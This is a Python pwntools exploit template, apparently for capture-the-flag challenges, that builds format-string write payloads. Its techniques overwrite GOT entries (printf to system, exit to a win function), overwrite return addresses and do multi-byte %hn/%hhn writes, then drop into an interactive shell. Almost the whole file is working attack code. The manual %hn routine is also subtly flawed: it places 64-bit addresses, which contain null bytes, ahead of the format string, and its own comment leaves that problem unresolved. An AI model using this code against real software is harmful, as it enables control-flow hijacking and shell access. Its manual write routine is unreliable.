#!/usr/bin/env python3
"""
format string write

GOT overwrite, __malloc_hook, return address — via format strings.

Techniques:
    1. pwntools fmtstr_payload() — auto write (easiest)
    2. Manual %n / %hn / %hhn writes
    3. Write-what-where for GOT overwrite
    4. Multi-write for full 8-byte address

usage:
    1. Set BINARY, HOST, PORT, context.arch
    2. Set BUFFER_OFFSET (use fmt_string_leak.py find_offset())
    3. Choose your write target and value
    4. Adjust send_payload() for your I/O
"""
from pwn import *
import sys

BINARY = './chall'
HOST   = '127.0.0.1'
PORT   = 1337

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF(BINARY) if os.path.exists(BINARY) else None


BUFFER_OFFSET = 6   # Which printf arg our buffer starts at

def conn():
    if 'local' in sys.argv:
        return process(BINARY)
    return remote(HOST, PORT)

def send_payload(p, payload):
    """Adjust for your challenge I/O."""
    p.sendline(payload)
    return p.recvline(timeout=5)


def auto_write(where, what):
    """
    Use pwntools fmtstr_payload to generate write payload.
    where: target address (e.g., GOT entry)
    what:  value to write (e.g., win function addr)
    """
    payload = fmtstr_payload(BUFFER_OFFSET, {where: what},
                             write_size='short')  # 'byte', 'short', 'int'
    log.info(f'Auto payload ({len(payload)}B): write {hex(what)} → {hex(where)}')
    return payload


def manual_hn_write(target, value, num_slots=4):
    """
    Write `value` (up to 8 bytes) to `target` using %hn (2-byte writes).
    Uses sequential printf args starting at BUFFER_OFFSET.

    Layout: [addr0][addr1][addr2][addr3][%Xc%N$hn...]
    """
    # Split value into 2-byte words
    words = [(value >> (16 * i)) & 0xffff for i in range(num_slots)]

    if context.arch == 'amd64':
        ptr_size = 8
        pack = p64
    else:
        ptr_size = 4
        pack = p32

    # Pack target addresses first
    addrs = b''
    for i in range(num_slots):
        addrs += pack(target + 2 * i)

    # Sort writes by value to minimize padding
    indexed = sorted(enumerate(words), key=lambda x: x[1])

    prev = 0
    fmt_parts = []
    # Map original index to its arg position
    for orig_idx, word in indexed:
        arg_num = BUFFER_OFFSET + orig_idx
        diff = (word - prev) % 0x10000
        if diff > 0:
            fmt_parts.append(f'%{diff}c')
        elif diff == 0 and prev == 0:
            pass  # first write, nothing printed yet
        fmt_parts.append(f'%{arg_num}$hn')
        prev = word

    # Build payload: addresses are consumed by positional %N$hn
    # But we need them at known offsets!
    # Alternative: put addresses at the END after format string
    payload = addrs + ''.join(fmt_parts).encode()
    log.info(f'Manual payload ({len(payload)}B)')
    return payload


def got_overwrite(got_func, target_addr):
    """
    Overwrite GOT entry of `got_func` with `target_addr`.
    Common: overwrite printf@GOT → system, overwrite exit@GOT → win
    """
    if elf is None:
        log.error('Need ELF for GOT addresses')
        return None

    got_addr = elf.got[got_func]
    log.info(f'{got_func}@GOT = {hex(got_addr)}')
    log.info(f'Overwriting with {hex(target_addr)}')

    return auto_write(got_addr, target_addr)


def multi_round_write(p, writes_dict):
    """
    Use pwntools FmtStr for exploits that need multiple rounds.

    writes_dict: {addr1: val1, addr2: val2, ...}

    You need a function that:
    1. Sends a format string
    2. Returns the output
    """
    def send_fmt(payload, *args, **kwargs):
        return send_payload(p, payload)

    fmt = FmtStr(send_fmt, offset=BUFFER_OFFSET)

    for addr, val in writes_dict.items():
        fmt.write(addr, val)

    fmt.execute_writes()


def write_byte(target, byte_val):
    """Write a single byte using %hhn."""
    if context.arch == 'amd64':
        addrs = p64(target)
    else:
        addrs = p32(target)

    if byte_val > 0:
        fmt = f'%{byte_val}c%{BUFFER_OFFSET}$hhn'.encode()
    else:
        fmt = f'%{BUFFER_OFFSET}$hhn'.encode()

    return addrs + fmt


def exploit():
    p = conn()

    # === Example 1: GOT overwrite printf → system ===
    # Then next printf("your_input") becomes system("your_input")
    # payload = got_overwrite('printf', elf.sym['system'])
    # send_payload(p, payload)
    # p.sendline(b'/bin/sh')

    # === Example 2: Overwrite return address ===
    # target = leaked_ret_addr  # stack address of return pointer
    # value  = elf.sym['win']
    # payload = auto_write(target, value)
    # send_payload(p, payload)

    # === Example 3: Multi-write ===
    # writes = {
    #     elf.got['exit']:    elf.sym['win'],
    #     elf.got['printf']:  elf.sym['system'],
    # }
    # payload = fmtstr_payload(BUFFER_OFFSET, writes, write_size='short')
    # send_payload(p, payload)

    p.interactive()

if __name__ == '__main__':
    exploit()
